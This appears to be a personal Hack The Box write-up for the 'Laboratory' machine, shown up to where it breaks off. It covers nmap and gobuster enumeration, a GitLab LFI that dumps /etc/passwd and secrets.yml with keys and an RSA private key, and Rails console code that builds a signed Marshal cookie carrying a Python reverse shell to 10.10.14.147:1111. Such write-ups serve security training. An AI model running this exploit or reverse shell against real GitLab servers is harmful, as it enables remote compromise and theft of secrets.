# Hack the box - Ready

IP: 10.10.10.216 

# Check connectivity
┌──(kali㉿kali)-[~/htb-laboratory]
└─$ ping 10.10.10.216                     
PING 10.10.10.216 (10.10.10.216) 56(84) bytes of data.
64 bytes from 10.10.10.216: icmp_seq=1 ttl=63 time=97.2 ms
64 bytes from 10.10.10.216: icmp_seq=2 ttl=63 time=96.5 ms
64 bytes from 10.10.10.216: icmp_seq=3 ttl=63 time=94.4 ms
^C
--- 10.10.10.216 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 94.351/96.013/97.159/1.203 ms


# Enumeration with nmap
```
┌──(kali㉿kali)-[~/htb-laboratory]
└─$ nmap -A 10.10.10.216
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-22 09:07 EST
Nmap scan report for 10.10.10.216
Host is up (0.097s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.96 seconds
```
dns:
- laboratory.htb
- git.laboratory.htb

# Edit /etc/hosts
```
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.215    academy.htb
10.10.10.215    dev-staging-01.academy.htb
10.10.10.216    laboratory.htb
10.10.10.216    git.laboratory.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

# Enumeration with gobuster
```
┌──(kali㉿kali)-[~/htb-laboratory]
└─$ gobuster dir -k -u https://laboratory.htb:443 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt --wildcard
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://laboratory.htb:443
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/22 09:43:37 Starting gobuster
===============================================================
/images (Status: 301)
/assets (Status: 301)
===============================================================
2020/12/22 10:11:27 Finished
===============================================================

```
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -k -u https://laboratory.htb:443 -w /usr/share/wordlists/dirb/big.txt --wildcard 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://laboratory.htb:443
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/22 09:59:55 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/images (Status: 301)
/server-status (Status: 403)
===============================================================
2020/12/22 10:03:57 Finished
===============================================================
```
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -k -u https://laboratory.htb:443/assets -w /usr/share/wordlists/dirb/big.txt --wildcard
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://laboratory.htb:443/assets
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/22 10:06:49 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/js (Status: 301)
===============================================================
2020/12/22 10:10:47 Finished
===============================================================

```

remainder: gitlab shit

## After n attemps... the account email when registering has to be with @git.laboratory.htb
![Gitlab Login](./images/gitlab_login.png "Gitlab Login")

### List users in gitlab server
```
https://git.laboratory.htb/autocomplete/users:

[{"id":1,"name":"Dexter McPherson","username":"dexter","state":"active","avatar_url":"http://git.laboratory.htb/uploads/-/system/user/avatar/1/avatar.png","web_url":"http://git.laboratory.htb/dexter","status_tooltip_html":null,"path":"/dexter"},{"id":4,"name":"Seven","username":"seven","state":"active","avatar_url":"http://git.laboratory.htb/uploads/-/system/user/avatar/4/avatar.png","web_url":"http://git.laboratory.htb/seven","status_tooltip_html":null,"path":"/seven"},{"id":6,"name":"asd","username":"asd","state":"active","avatar_url":null,"web_url":"http://git.laboratory.htb/asd","status_tooltip_html":null,"path":"/asd"},{"id":7,"name":"cdlsn","username":"cdlsn","state":"active","avatar_url":null,"web_url":"http://git.laboratory.htb/cdlsn","status_tooltip_html":null,"path":"/cdlsn"},{"id":5,"name":"hola","username":"hola","state":"active","avatar_url":null,"web_url":"http://git.laboratory.htb/hola","status_tooltip_html":null,"path":"/hola"}]

```

## Maybe we can exploit (LFI+RCE):
[Gitlab LFI + RCE](https://hackerone.com/reports/827052)
[Russian RCEs VImeo channel](https://vimeo.com/422686763)

# LFI
## LFI. Its broken...
/etc/passwd:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
```

/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml:
```
# This file is managed by gitlab-ctl. Manual changes will be
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.

---
production:
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    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
    -----END RSA PRIVATE KEY-----


```

# RCE
## Recreate env to generate personalized cookie with the commands that we want
https://www.netsparker.com/blog/web-security/understanding-reverse-shells/

Create gitlab docker container:
```
docker run --rm -d --hostname gitlab.example.com -p 443:443 -p 80:80 -p 2222:22 --name gitlab gitlab/gitlab-ce:12.9.0-ce.0

```
Change secret_key_base with the one from hack the box machine

docker:
```
secret_key_base: 60ccff84b73b3193bb39f0bf913ac64ee42c2532e2eeef79515c6390b49f8da0345da882fc722e2ecec5a7034205b319c6e5df6e2e2a06fe53c420e024a52540
```
htb:
```
secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
```

to execute in gitlab-rails console:, in our docker (172.17.0.2) our host is 172.17.0.1, in kali machine the target it to execute a reverse shell will be 10.10.14.147:
```
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.48\",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```
```
root@gitlab:/# nano /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
root@gitlab:/# gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.9.0 (9a382ff2c82) FOSS
 GitLab Shell: 12.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0> request = ActionDispatch::Request.new(Rails.application.env_config)
=> #<ActionDispatch::Request:0x00007ff368a6c5a8 @env={"action_dispatch.parameter_filter"=>[/token$/, /password/, /secret/, /key$/, /^body$/, /^description$/, /^note$/, /^text$/, /^title$/, :certificate, :encrypted_key, :hook, :import_url, :otp_attempt, :sentry_dsn, :trace, :variables, :content, :sharedSecret, /^((?-mix:client_secret|code|authentication_token|access_token|refresh_token))$/], "action_dispatch.redirect_filter"=>[], "action_dispatch.secret_key_base"=>"3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", "action_dispatch.show_exceptions"=>true, "action_dispatch.show_detailed_exceptions"=>false, "action_dispatch.logger"=>#<ActiveSupport::Logger:0x00007ff380874f30 @level=1, @progname=nil, @default_formatter=#<Logger::Formatter:0x00007ff380894c90 @datetime_format=nil>, @formatter=#<ActiveSupport::Logger::SimpleFormatter:0x00007ff380874ee0 @datetime_format=nil, @thread_key="activesupport_tagged_logging_tags:70341905065840">, @logdev=#<Logger::LogDevice:0x00007ff380894c40 @shift_period_suffix=nil, @shift_size=nil, @shift_age=nil, @filename=nil, @dev=#<File:/opt/gitlab/embedded/service/gitlab-rails/log/production.log>, @mon_mutex=#<Thread::Mutex:0x00007ff380894b78>, @mon_mutex_owner_object_id=70341905131040, @mon_owner=nil, @mon_count=0>>, "action_dispatch.backtrace_cleaner"=>#<Rails::BacktraceCleaner:0x00007ff37cdd5028 @silencers=[#<Proc:0x00007ff378194880@/opt/gitlab/embedded/service/gitlab-rails/config/initializers/backtrace_silencers.rb:8>], @filters=[#<Proc:0x00007ff37cdd4c40@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/activesupport-6.0.2/lib/active_support/backtrace_cleaner.rb:97>, #<Proc:0x00007ff37cdd4ab0@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:16>, #<Proc:0x00007ff37cdd4a88@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:17>, #<Proc:0x00007ff37cdd4a38@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:18>], @root="/opt/gitlab/embedded/service/gitlab-rails/">, "action_dispatch.key_generator"=>#<ActiveSupport::CachingKeyGenerator:0x00007ff36e1c22a8 @key_generator=#<ActiveSupport::KeyGenerator:0x00007ff36e1c2410 @secret="3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", @iterations=1000>, @cache_keys=#<Concurrent::Map:0x00007ff36e1c2118 entries=1 default_proc=nil>>, "action_dispatch.http_auth_salt"=>"http authentication", "action_dispatch.signed_cookie_salt"=>"signed cookie", "action_dispatch.encrypted_cookie_salt"=>"encrypted cookie", "action_dispatch.encrypted_signed_cookie_salt"=>"signed encrypted cookie", "action_dispatch.authenticated_encrypted_cookie_salt"=>"authenticated encrypted cookie", "action_dispatch.use_authenticated_cookie_encryption"=>false, "action_dispatch.encrypted_cookie_cipher"=>nil, "action_dispatch.signed_cookie_digest"=>nil, "action_dispatch.cookies_serializer"=>:hybrid, "action_dispatch.cookies_digest"=>nil, "action_dispatch.cookies_rotations"=>#<ActiveSupport::Messages::RotationConfiguration:0x00007ff38b16bb98 @signed=[], @encrypted=[]>, "action_dispatch.use_cookies_with_metadata"=>false, "action_dispatch.content_security_policy"=>nil, "action_dispatch.content_security_policy_report_only"=>false, "action_dispatch.content_security_policy_nonce_generator"=>nil, "action_dispatch.content_security_policy_nonce_directives"=>nil}, @filtered_parameters=nil, @filtered_env=nil, @filtered_path=nil, @protocol=nil, @port=nil, @method=nil, @request_method=nil, @remote_ip=nil, @original_fullpath=nil, @fullpath=nil, @ip=nil>
irb(main):002:0> request.env["action_dispatch.cookies_serializer"] = :marshal
=> :marshal
irb(main):003:0> cookies = request.cookie_jar
=> #<ActionDispatch::Cookies::CookieJar:0x00007ff36927a790 @set_cookies={}, @delete_cookies={}, @request=#<ActionDispatch::Request:0x00007ff368a6c5a8 @env={"action_dispatch.parameter_filter"=>[/token$/, /password/, /secret/, /key$/, /^body$/, /^description$/, /^note$/, /^text$/, /^title$/, :certificate, :encrypted_key, :hook, :import_url, :otp_attempt, :sentry_dsn, :trace, :variables, :content, :sharedSecret, /^((?-mix:client_secret|code|authentication_token|access_token|refresh_token))$/], "action_dispatch.redirect_filter"=>[], "action_dispatch.secret_key_base"=>"3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", "action_dispatch.show_exceptions"=>true, "action_dispatch.show_detailed_exceptions"=>false, "action_dispatch.logger"=>#<ActiveSupport::Logger:0x00007ff380874f30 @level=1, @progname=nil, @default_formatter=#<Logger::Formatter:0x00007ff380894c90 @datetime_format=nil>, @formatter=#<ActiveSupport::Logger::SimpleFormatter:0x00007ff380874ee0 @datetime_format=nil, @thread_key="activesupport_tagged_logging_tags:70341905065840">, @logdev=#<Logger::LogDevice:0x00007ff380894c40 @shift_period_suffix=nil, @shift_size=nil, @shift_age=nil, @filename=nil, @dev=#<File:/opt/gitlab/embedded/service/gitlab-rails/log/production.log>, @mon_mutex=#<Thread::Mutex:0x00007ff380894b78>, @mon_mutex_owner_object_id=70341905131040, @mon_owner=nil, @mon_count=0>>, "action_dispatch.backtrace_cleaner"=>#<Rails::BacktraceCleaner:0x00007ff37cdd5028 @silencers=[#<Proc:0x00007ff378194880@/opt/gitlab/embedded/service/gitlab-rails/config/initializers/backtrace_silencers.rb:8>], @filters=[#<Proc:0x00007ff37cdd4c40@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/activesupport-6.0.2/lib/active_support/backtrace_cleaner.rb:97>, #<Proc:0x00007ff37cdd4ab0@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:16>, #<Proc:0x00007ff37cdd4a88@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:17>, #<Proc:0x00007ff37cdd4a38@/opt/gitlab/embedded/lib/ruby/gems/2.6.0/gems/railties-6.0.2/lib/rails/backtrace_cleaner.rb:18>], @root="/opt/gitlab/embedded/service/gitlab-rails/">, "action_dispatch.key_generator"=>#<ActiveSupport::CachingKeyGenerator:0x00007ff36e1c22a8 @key_generator=#<ActiveSupport::KeyGenerator:0x00007ff36e1c2410 @secret="3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3", @iterations=1000>, @cache_keys=#<Concurrent::Map:0x00007ff36e1c2118 entries=1 default_proc=nil>>, "action_dispatch.http_auth_salt"=>"http authentication", "action_dispatch.signed_cookie_salt"=>"signed cookie", "action_dispatch.encrypted_cookie_salt"=>"encrypted cookie", "action_dispatch.encrypted_signed_cookie_salt"=>"signed encrypted cookie", "action_dispatch.authenticated_encrypted_cookie_salt"=>"authenticated encrypted cookie", "action_dispatch.use_authenticated_cookie_encryption"=>false, "action_dispatch.encrypted_cookie_cipher"=>nil, "action_dispatch.signed_cookie_digest"=>nil, "action_dispatch.cookies_serializer"=>:marshal, "action_dispatch.cookies_digest"=>nil, "action_dispatch.cookies_rotations"=>#<ActiveSupport::Messages::RotationConfiguration:0x00007ff38b16bb98 @signed=[], @encrypted=[]>, "action_dispatch.use_cookies_with_metadata"=>false, "action_dispatch.content_security_policy"=>nil, "action_dispatch.content_security_policy_report_only"=>false, "action_dispatch.content_security_policy_nonce_generator"=>nil, "action_dispatch.content_security_policy_nonce_directives"=>nil, "rack.request.cookie_hash"=>{}, "action_dispatch.cookies"=>#<ActionDispatch::Cookies::CookieJar:0x00007ff36927a790 ...>}, @filtered_parameters=nil, @filtered_env=nil, @filtered_path=nil, @protocol=nil, @port=nil, @method=nil, @request_method=nil, @remote_ip=nil, @original_fullpath=nil, @fullpath=nil, @ip=nil>, @cookies={}, @committed=false>
irb(main):004:0> erb = ERB.new("<%= `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.147\",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &` %>")
=> #<ERB:0x00007ff366ced130 @safe_level=nil, @src="#coding:UTF-8\n_erbout = +''; _erbout.<<(( `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.147\",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &` ).to_s); _erbout", @encoding=#<Encoding:UTF-8>, @frozen_string=nil, @filename=nil, @lineno=0>
irb(main):005:0> depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
Traceback (most recent call last):
  File "<string>", line 1, in <module>
ConnectionRefusedError: [Errno 111] Connection refused
=> ""
irb(main):006:0> cookies.signed[:cookie] = depr
DEPRECATION WARNING: @result is deprecated! Call result.is_a? instead of @result.is_a?. Args: [Hash] (called from irb_binding at (irb):6)
Traceback (most recent call last):
  File "<string>", line 1, in <module>
ConnectionRefusedError: [Errno 111] Connection refused
Traceback (most recent call last):
  File "<string>", line 1, in <module>
ConnectionRefusedError: [Errno 111] Connection refused
=> ""
irb(main):007:0> puts cookies[:cookie]
BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAiQBI2NvZGluZzpVVEYtOApfZXJib3V0ID0gKycnOyBfZXJib3V0Ljw8KCggYHB5dGhvbjMgLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIxMC4xMC4xNC4xNDciLDExMTEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycgJmAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--99a3dfcf90767bdb3f0e6ea7bd365b198ca0ad69
=> nil
irb(main):008:0> 

```
our token to send:
